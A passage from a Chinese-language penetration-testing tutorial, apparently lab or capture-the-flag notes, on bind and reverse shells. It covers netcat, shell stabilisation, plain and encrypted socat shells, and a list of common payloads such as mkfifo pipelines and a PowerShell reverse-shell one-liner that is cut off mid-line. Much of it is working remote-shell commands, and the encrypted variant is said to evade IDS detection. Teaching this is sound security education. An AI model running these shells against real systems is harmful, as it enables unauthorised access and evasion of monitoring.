<p>绑定 shell 不太常见，但仍然非常有用。<br>
请看下面的图片。同样，左边是攻击者的电脑，右边是模拟目标。为了稍微改变一下，这次我们将使用 Windows 目标。</p>
<p>首先，我们在右边的目标上启动一个监听器–这一次，我们告诉它执行cmd.exe，然后，当目标机上的监听器启动并运行时，我们从自己的机器发送连接到目标机上新打开的端口</p>
<pre><code class="hljs scss">#在目标机上设置监听器，当监听器被触发时 执行cmd<span class="hljs-selector-class">.exe</span>程序：
nc -lvnp &lt;port&gt; -e "cmd<span class="hljs-selector-class">.exe</span>"

#在攻击机上发出连接请求：
nc MACHINE_IP &lt;port&gt;     <span class="hljs-selector-id">#MACHINE_IP</span> &lt;port&gt; 指的是目标机的ip和打开的端口</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240324104427246.png" alt="image-20240324104427246"></p>
<p>正如你所看到的，这再次为我们提供了在远程计算机上执行代码的机会。<br>
注意，这种情况不是 Windows 特有的，重要的是要明白，我们正在目标上开启监听器，然后用我们自己的机器主动去连接到它（目标）。</p>
<p>最后一个与本小节相关的概念是交互性。shell可以是交互式的，也可以是非交互式的。</p>
<p><strong>交互式shell</strong></p>
<p>如果你使用过 Powershell、 Bash、 Zsh、 sh 或任何其他标准的CLI（命令行）环境，那么你已经接触过交互式shell。<br>
交互式shell允许你在执行程序之后与它们发生交互。</p>
<p>例如，使用SSH登录:</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20240324104654304.png" alt="image-20240324104654304"></p>
<p>在这里，你可以看到它以交互方式请求用户输入 yes 或 no 以继续进行登录连接。这是一个交互式程序，它需要一个交互式 shell 才能运行。</p>
<p><strong>非交互式shell</strong></p>
<p>非交互式shell 不会给你发生交互的机会。在非交互式shell中，只能使用不需要用户交互就能正常运行的程序。不幸的是，大多数简单的反向和绑定 shell 都是非交互式的，这可能会使进一步的漏洞利用变得更加棘手。</p>
<p>让我们看看在非交互式 shell 中运行 SSH 时会发生什么:</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104750168.png" alt="image-20240324104750168"></p>
<p>由上图可以看到，whoami 命令(非交互式)执行得非常完美，但 ssh 命令(交互式)根本不会给我们任何输出。不过，有趣的是，交互式命令的输出确实可以到达某个地方。</p>
<p>可以说，交互式程序不能在非交互式 shell 中工作。此外，在截图中可以看到一个名为listener的命令，此命令是用于演示的攻击机器自定义的独有别名，是sudo rlwrap nc -lvnp 443 命令的速记方法。除非你在本地配置了这个别名，否则它不会在任何其他机器上工作。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104929187.png" alt="image-20240324104929187"></p>
<h1 id="0x04-netcat">0x04 Netcat</h1>
<h2 id="netcat建立反向shell">Netcat建立反向shell</h2>
<p>建立反向 shell 需要执行反向shell 代码以及设置监听器，执行 shellcode 的方法有很多，所以我们先从设置监听器开始。</p>
<p>使用 Linux 启动 netcat 监听器的语法如下:</p>
<pre><code class="hljs scss">nc -lvnp &lt;port-number&gt;

-l            #用来告诉netcat这将是一个监听器listener
-v            #用于请求详细输出
-n            #告诉netcat不要解析主机名或者使用DNS
-<span class="hljs-selector-tag">p</span>            #指定端口


<span class="hljs-selector-id">#netcat</span>常用参数列表：
-l：用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。
-<span class="hljs-selector-tag">p</span>：本地端口
-s：指定发送数据的源IP地址，适用于多网卡机 
-u：指定nc使用UDP协议，默认为TCP
-v：输出交互或出错信息，新手调试时尤为有用
-w：超时秒数，后面跟数字
-z：表示zero，表示扫描时不发送任何数据
-<span class="hljs-selector-tag">i</span>：secs 延时的间隔
-L：连接关闭，仍然继续监听
-n：指定数字ip，不能用hostname
-o：file 记录<span class="hljs-number">16</span>进制的传输
-r：随机本地及远程端口
-t：使用Telnet交互方式</code></pre>
<p>上一个小节中使用的端口是443。实际上，你可以使用任何你喜欢的端口，只要这个端口还没有被服务所占用。请注意：如果选择使用低于1024的端口，则在启动监听器时需要使用 sudo。使用一个众所周知的端口号(80、443或53)通常是一个好主意，因为这更有可能绕过目标的出站防火墙规则</p>
<p>例子：</p>
<pre><code class="hljs scss">sudo nc -lvnp <span class="hljs-number">443</span></code></pre>
<p>然后，我们可以使用任意数量的payload（有效载荷）连接到这个目标，具体情况取决于目标环境。</p>
<h2 id="netcat建立绑定shell">Netcat建立绑定shell</h2>
<p>如果我们希望在目标上获得绑定 shell，那么我们可以假设在目标机的选定端口上已经有一个监听器正在等待我们: 我们所需要做的就是使用攻击机主动连接到它。<br>
这句话的语法相对简单:</p>
<pre><code class="hljs scss">nc &lt;target-ip&gt; &lt;chosen-port&gt;  #攻击机发出连接到目标机</code></pre>
<p>在这里，我们使用 netcat 指定我们选择的目标机端口（目标机上的监听器正在监听的端口），以此建立到目标机的向外连接。（在本文后面的内容中，将会讲解如何使用netcat 在目标机上设置监听器）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324105316573.png" alt="image-20240324105316573"></p>
<h1 id="0x05-shell的稳定化">0x05 shell的稳定化</h1>
<p>我们已经捕获或连接到一个 Netcat shell，接下来该做什么？（对shell进行稳定化处理）</p>
<p>默认情况下，这些shell非常不稳定，按下 Ctrl + C 就会杀死整个Netcat程序，而且它们是非交互的，经常会有奇怪的格式错误。这是因为 netcat“shell”实际上是在终端内运行的进程，而不是真正的终端本身。</p>
<p>幸运的是，在 Linux 系统上有许多稳定 netcat shell 的方法，我们会在这里提到三个。Windows反向shell的稳定化往往要困难得多，然而，我们将要在这里介绍的第二个技巧对它也特别有用。</p>
<h2 id="技巧1-python">技巧1: Python</h2>
<p>我们将讨论的第一种技巧只适用于 Linux 机器，因为在默认情况下Linux机器几乎总是会安装 Python。<br>
这是一个分为三个阶段的过程（shell稳定化的前提是已经获得或者连接到shell）:</p>
<ol>
<li>首先要做的是使用命令：<code>python -c 'import pty;pty.spawn("/bin/bash")'</code><br>
它将使用 Python 产生一个功能更好的 bash shell 。<br>
请注意，有些目标可能需要指定Python 版本，如果是这样的话：根据需要将 python 替换为 python2 或 python3 。<br>
这时我们的 shell 会看起来更好一些，但是我们仍然不能使用tab键自动补全功能或者方向键功能,按下Ctrl + C 仍然会杀死这个shell 。</li>
<li>第二步是：执行<code>export TERM=xterm</code> ，这将使我们能够访问一些术语命令，例如clear命令。</li>
<li>最后(也是最重要的) ，我们将使用 Ctrl + Z按键对 shell 进行后台化处理，对shell后台化之后再前台化：用 <code>stty raw -echo; fg</code> 回到我们自己的终端前台。<br>
执行上面的前台化命令，将会做两件事: 首先，这个前台化命令会关闭我们自己本身的终端输出 (它允许我们访问tab键自动补全、方向键和按下 Ctrl + C 终止进程)，然后再将之前建立的反向shell 前台化，从而完成稳定化过程。</li>
</ol>
<p>完整的过程如下（实质上是用反向shell取代了我们自己原来使用的终端）：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324105811487.png" alt="image-20240324105811487"></p>
<p>注意：如果 shell 失效，你的终端中的任何输入都将不可见(这是由于原终端回显被禁用)。要解决这个问题，请输入<code>reset</code>命令，然后按下回车键。</p>
<h2 id="技巧2-rlwrap">技巧2: rlwrap</h2>
<p>rlwrap是一个程序，简单地说，它可以让我们在捕获到shell时立即访问历史记录、 tab自动补全键和方向键；然而，如果你想在这个shell 中使用 Ctrl + C，还是必须使用一些其他技巧进一步稳定化shell。</p>
<p>默认情况下，kali没有安装rlwrap，所以如果要在kali中使用rlwrap，请先安装一下：</p>
<pre><code class="hljs scss">sudo apt install rlwrap</code></pre>
<p>要使用 rlwrp，我们需要调用一个稍微不同的监听器:</p>
<pre><code class="hljs scss">rlwrap nc -lvnp &lt;port&gt;</code></pre>
<p>在netcat监听器前面加上" rlwrap "可以提供一个功能更全面的 shell。这个技巧在处理 Windows的shell时特别有用，因为众所周知，Windows的shell很难稳定。</p>
<p>在处理 Linux 目标时，可以使用与前面第一个技巧中的第三个步骤相同的方法来完全稳定化shell：先用 Ctrl + Z 后台化 shell，然后再使用<code>stty raw-echo; fg</code> 命令来稳定化并重新进入 shell。</p>
<h2 id="技巧3-socat">技巧3: Socat</h2>
<p>稳定shell的第三个简单方法是使用一个初始的 netcat shell作为进入功能更全面的 socat shell的垫脚石。请记住，这种技巧最好是针对 Linux 目标，因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。</p>
<p>为了实现这种稳定方法，我们首先需要将一个 socat 静态编译的二进制文件(编译为没有依赖关系的程序的一个版本)传输到目标机器上。一个典型的实现方法是：让攻击机在包含 socat 二进制文件的目录中开启一个简易的webserver(<code>sudo python3 -m http.server 80</code>)。然后在目标机器上使用netcat shell界面下载文件，在 Linux 上，这可以通过 curl 或 wget (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>)来完成。</p>
<p>为了完整性起见，在这里附上目标机是Windows操作系统的情况:</p>
<p>在一个 Windows CLI（命令行）环境中，同样的事情（下载socat文件）也可以在 Powershell 中完成，使用 Invoke-WebRequest 或者 webrequest 系统类，</p>
<p>这取决于安装的 Powershell 版本(<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code>)。</p>
<p>在接下来的小节中，我们将介绍使用Socat发送和接收shell的语法。</p>
<blockquote>
<p>socat二进制文件下载地址（点击将自动下载）：<br>
<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat">https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat</a><br>
socat官网：<br>
<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/">http://www.dest-unreach.org/</a></p>
</blockquote>
<p>使用以上任何一种技术，都可以更改终端 tty 大小，这是你的终端在使用常规 shell 时会自动完成的事情; 但是，如果你想打开类似文本编辑器的东西来覆盖屏幕上的所有内容（即：在终端中打开文本编辑器），那么必须在反向或绑定 shell 中手动完成终端界面宽高尺寸的更改。</p>
<p>首先，打开另一个终端并运行 stty-a ，这将为你提供大量的输出流，记下开头部分" 行 “和” 列 "的值:</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324111042250.png" alt="image-20240324111042250"></p>
<p>接下来，在反向/绑定 shell 中输入以下两个命令:</p>
<pre><code class="hljs scss">stty rows &lt;number&gt;
<span class="hljs-selector-id">#and</span>
stty cols &lt;number&gt;</code></pre>
<p>填写你刚才在自己的终端上运行 stty-a 命令所得到的行和列的值。</p>
<p>这将改变反向/绑定shell界面的宽度和高度，从而使一些程序，如文本编辑器，能够依赖于这些宽高信息的准确性来正确地打开。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324111226451.png" alt="image-20240324111226451"></p>
<h1 id="0x06-socat">0x06 Socat</h1>
<p>Socat 在某些方面与 netcat 相似，但在其他许多方面有根本不同。理解socat 的最简单方法是把它当做一个两点之间的连接器。这两个点实际上可以是一个监听端口和键盘，也可以是一个监听端口和一个文件，或者可以是两个监听端口，而socat 所做的只是提供两点之间的链接。</p>
<p>让我们再次从反向 shell 开始。</p>
<h2 id="reverse-shells反向shell">Reverse Shells（反向shell）</h2>
<p>如前所述，socat 的语法比 netcat 的语法难得多，下面是在socat 中设置反向 shell 监听器的基本语法:</p>
<pre><code class="hljs scss">socat TCP-L:&lt;port&gt; -</code></pre>
<p>在socat中，这需要获取两个点(一个监听端口和一个标准输入)并将它们连接在一起，如此建立的 shell 是不稳定的，但它可以在 Linux 或 Windows 上工作，相当于Netcat中的 <code>nc -lvnp &lt;port&gt;</code>.</p>
<p>在Windows操作系统的目标机上，我们使用这个命令来连接攻击机:</p>
<pre><code class="hljs scss">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</code></pre>
<p>“pipes”选项用于强制 powershell (或 cmd.exe)使用 Unix 风格的标准输入和输出形式。</p>
<p>在Linux系统的目标机上，使用以下命令来连接攻击机：</p>
<pre><code class="hljs scss">socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:<span class="hljs-string">"bash -li"</span></code></pre>
<h2 id="bind-shells绑定shell">Bind Shells（绑定shell）</h2>
<p>在 Linux 目标上，我们将使用以下命令设置监听器:</p>
<pre><code class="hljs scss">socat TCP-L:&lt;PORT&gt; EXEC:<span class="hljs-string">"bash -li"</span></code></pre>
<p>在 Windows 目标上，我们将使用以下命令设置监听器:</p>
<pre><code class="hljs scss">socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></pre>
<p>我们使用" pipes "参数来连接 Unix 和 Windows 在 CLI （命令行）环境中处理输入和输出的方式。</p>
<p>不管目标是什么，我们在攻击机器上使用以下命令来连接到 正在目标机上等待的监听器：</p>
<pre><code class="hljs scss">socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></pre>
<p>现在让我们看看 Socat 更强大的用途之一：建立完全稳定的 Linux tty 反向 shell。这仅在目标是 Linux 时有效，会建立一个更稳定的反向shell。</p>
<p>如前所述，socat 是一个非常通用的工具，以下技巧可能是其最有用的应用之一，这是新的监听器设置语法：</p>
<pre><code class="hljs scss">socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=<span class="hljs-number">0</span></code></pre>
<p>让我们分析此命令，像往常一样，我们将两个点连接在一起，但是在这里的点是监听端口和文件。</p>
<p>具体地说，我们将当前的 TTY （TTY含义为：终端）作为文件传递并将它的回显设置为零。这大约相当于使用 Ctrl + Z以及netcat shell 的<code>stty raw -echo; fg</code>技巧，这样处理的额外好处是能够立即建立一个稳定的shell并能连接到完整的 tty（终端）。</p>
<p>普通的socat监听器可以连接到任何有效负载；然而，上面这个特殊的监听器必须用一个非常具体的 socat 命令来激活，这意味着目标机必须安装 socat。</p>
<p>大多数机器默认情况下没有安装socat，但是，我们可以上传一个预编译的socat二进制文件，然后继续正常执行我们的命令。</p>
<blockquote>
<p>预编译的socat二进制文件：<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true</a></p>
</blockquote>
<p>特殊命令如下：</p>
<pre><code class="hljs scss">socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:<span class="hljs-string">"bash -li"</span>,pty,stderr,sigint,setsid,sane</code></pre>
<p>这是一个很复杂的命令，所以让我们分解一下。</p>
<p>第一部分很简单——我们正在 与在我们自己的攻击机上运行的监听器进行连接，第二部分使用 EXEC:“bash -li” 创建一个交互式 bash 会话，我们还传递了参数：pty、stderr、sigint、setsid 和 sane</p>
<ul>
<li><strong>pty</strong>：在目标上分配一个伪终端——这是稳定化过程的一部分</li>
<li><strong>stderr</strong>：确保在 shell 中能够显示错误消息（通常是非交互式 shell 的问题）</li>
<li><strong>sigint</strong>：将任何 Ctrl + C 命令传递到子进程中，允许我们在 shell 中使用 Ctrl+C 终止命令</li>
<li><strong>setsid</strong>：在新会话中创建进程</li>
<li><strong>sane</strong>：稳定终端，试图将终端“正常化”。</li>
</ul>
<p>这看起来有很多东西需要考虑，所以让我们看看它的实际效果。</p>
<p>在左边我们有一个监听器运行在我们的本地攻击机上，在右边我们有一个已经建立好的反向shell，正在使用非交互式 shell 运行。我们使用非交互式的netcat shell，执行特殊的 socat 命令，并在左侧的 socat 监听器中接收一个完全交互式的 bash shell:</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114025471.png" alt="image-20240324114025471"></p>
<p>请注意，socat shell 是完全交互式的，允许我们使用交互式命令，例如 SSH。 然后我们还可以通过 设置上一个小节中所提到的 stty 值来进一步改进shell，这将让我们能够更好地使用文本编辑器，如 Vim 或 Nano。</p>
<p>如果socat shell 突然无法正常工作，则可以通过在命令中添加 <code>-d -d</code> 来增加信息输出的详细程度，这在实验环境下非常有用，但在一般用途中通常不是必需的。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114138826.png" alt="image-20240324114138826"></p>
<h1 id="0x07-socat加密shell">0x07 Socat加密shell</h1>
<p>Socat 的许多优点之一就是它能够创建加密的 shell ——绑定shell和反向shell。除非你有解密密钥，否则无法监视加密的 shell，这样通常能够绕过 IDS检测。</p>
<p>我们在前面讨论了如何创建基本的 shell，因此在这里不再讨论一些基本语法。</p>
<p>可以说，只要把 <code>TCP</code> 用作命令的一部分，就应该在使用加密shell 时将其替换为 <code>OPENSSL</code>。 我们将在本小节结束时介绍一些示例，但首先让我们谈谈证书。</p>
<h2 id="加密反向shell">加密反向shell</h2>
<p>为了建立加密的shell，我们首先需要生成一个证书，这在我们的攻击机上很容易做到:</p>
<pre><code class="hljs scss">openssl req <span class="hljs-attr">--newkey</span> rsa:<span class="hljs-number">2048</span> -nodes -keyout shell.key -x509 -days <span class="hljs-number">362</span> -out shell.crt</code></pre>
<p>该命令会创建一个2048位的 RSA 密钥，以及一个匹配的 cert 文件，有自签名且有效期不到一年。当你运行此命令时，它将要求你填写有关证书的信息，你可以留空，也可以随机填写。</p>
<p>然后，我们需要将刚才两个创建的文件合并到一个.pem 文件中:</p>
<pre><code class="hljs scss">cat shell<span class="hljs-selector-class">.key</span> shell<span class="hljs-selector-class">.crt</span> &gt; shell<span class="hljs-selector-class">.pem</span></code></pre>
<p>现在，当我们设置反向 shell 监听器时，可以使用以下命令:</p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=<span class="hljs-number">0</span> -</code></pre>
<p>这将使用我们生成的证书设置一个 OPENSSL 监听器，参数 verify=0 告诉连接不要费心尝试验证我们的证书是否已由公认的权威机构正确签名。 请注意，证书必须在正在监听的设备上使用（即：有监听器的地方就要有PEM文件）。</p>
<p>设置好监听器后，为了回连到该监听器，我们将使用:</p>
<pre><code class="hljs scss">socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=<span class="hljs-number">0</span> EXEC:/bin/bash</code></pre>
<h2 id="加密绑定shell">加密绑定shell</h2>
<p>建立加密的绑定 shell 也采用 和上面同样的技巧:</p>
<p><em>目标机上</em></p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=<span class="hljs-number">0</span> EXEC:cmd.exe,pipes</code></pre>
<p><em>攻击机上</em></p>
<pre><code class="hljs scss">socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=<span class="hljs-number">0</span> -</code></pre>
<p>再次注意：即使是针对 Windows 目标机建立绑定shell，证书也必须与监听器一起使用，因此需要为绑定 shell 复制 PEM 文件。</p>
<p>下图显示了来自 Linux 目标的 OPENSSL 反向 shell， 左边是攻击机终端界面，右边是已经建立的非交互式反向shell界面（右边的listener是自定义的别名）：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114828531.png" alt="image-20240324114828531"></p>
<p>这种加密技巧也适用于上一个小节中介绍的特殊的、仅限 Linux 的 TTY（终端）反向shell —— 弄清楚它的语法将是本小节答题的关键。</p>
<pre><code class="hljs scss">socat OPENSSL-LISTEN:<span class="hljs-number">53</span>,cert=encrypt.pem,verify=<span class="hljs-number">0</span> FILE:`tty`,raw,echo=<span class="hljs-number">0</span>                #对socat tty技巧的加密处理--设置攻击机上的监听器
socat  OPENSSL:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.5</span>:<span class="hljs-number">53</span>,verify=<span class="hljs-number">0</span>  EXEC:<span class="hljs-string">"bash -li"</span>,pty,stderr,sigint,setsid,sane   #对socat tty技巧的加密处理--让目标机</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324115749745.png" alt="image-20240324115749745"></p>
<h1 id="0x08-常用shell-payload">0x08 常用shell payload</h1>
<p>之前有提到我们正在寻找一些方法来使用 netcat 作为绑定 shell 的监听器，所以我们将从它开始。</p>
<p>在 netcat 的某些版本中，包括Windows 版的nc.exe（Kali Linux也附带了，位于 /usr/share/windows-resources/binaries），还有 Kali 本身使用的版本，即netcat-traditional，都有一个 -e 选项允许你在shell的连接上执行进程。</p>
<p>例如，在目标机上设置监听器时：</p>
<pre><code class="hljs scss">nc -lvnp &lt;PORT&gt; -e /bin/bash</code></pre>
<p>用 netcat 连接到上面的监听器将在目标上产生一个绑定 shell。</p>
<p>同样，对于反向 shell，在目标机上执行以下命令：</p>
<pre><code class="hljs scss">nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code></pre>
<p>目标机将回连攻击机上的监听器，这样会产生一个反向 shell。</p>
<p>但是，大多数版本的 netcat 都不包含此功能（指 -e选项），因为人们普遍认为它非常不安全。<br>
在几乎总是需要静态二进制文件的 Windows目标机上，以上技巧（指 -e选项）将完美运行；然而，在 Linux的目标机上，我们将改为使用以下代码为绑定 shell 创建一个监听器：</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f     #在linux目标机上执行</code></pre>
<p>以下段落是此命令的技术说明——命令本身才是最重要的。</p>
<p>该命令首先会在 /tmp/f 处创建命名管道（FIFO–First In，First Out），然后它启动一个 netcat 监听器，并将监听器的输入连接到命名管道的输出。netcat 监听器的输出（即我们发送的命令）再直接通过管道（管道符" | "）传输到 sh，将 stderr 输出流发送到 stdout，并将 stdout 本身发送到命名管道的输入，从而完成循环。</p>
<p>关于命名管道的介绍：<a target="_blank" rel="noopener" href="https://www.linuxjournal.com/article/2156">https://www.linuxjournal.com/article/2156</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120207677.png" alt="image-20240324120207677"></p>
<p>一个非常类似的命令可以用来发送 netcat 反向 shell:</p>
<pre><code class="hljs scss">mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>; rm /tmp/f     #在linux目标机上执行</code></pre>
<p>这个命令实际上与前一个命令相同，只是此命令将使用 netcat 主动连接语法，而不是使用 netcat 监听语法。(下图示例中的左侧使用了自定义别名)</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120249831.png" alt="image-20240324120249831"></p>
<p>当目标是一个现代的 Windows Server 时，建立 Powershell 反向 shell 是非常常见的，因此我们将在这里介绍标准的一行 PSH 反向 shell。</p>
<p>这个命令非常复杂，因此为了简单起见，这里不会直接解释它，记住，这是一行非常有用的命令:</p>
<pre><code class="hljs scss">powershell -c "<span class="hljs-variable">$client</span> = New-<span class="hljs-selector-tag">Object</span> System<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.TCPClient</span>('&lt;ip&gt;',&lt;port&gt;);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span><span class="hljs-selector-class">.GetStream</span>();<span class="hljs-selector-attr">[byte[]</span>]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-selector-class">.65535</span>|%{<span class="hljs-number">0</span>};<span class="hljs-built_in">while</span>(($i = $stream.Read($bytes, <span class="hljs-number">0</span>, $bytes.Length)) -ne <span class="hljs-number">0</span>){;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding)<span class="hljs-selector-class">.GetString</span>($bytes,<span class="hljs-number">0</span>, $i);<span class="hljs-variable">$sendback</span> = (iex $data <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + 'PS ' + (pwd)<span class="hljs-selector-class">.Path</span> + '&gt; ';<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII)<span 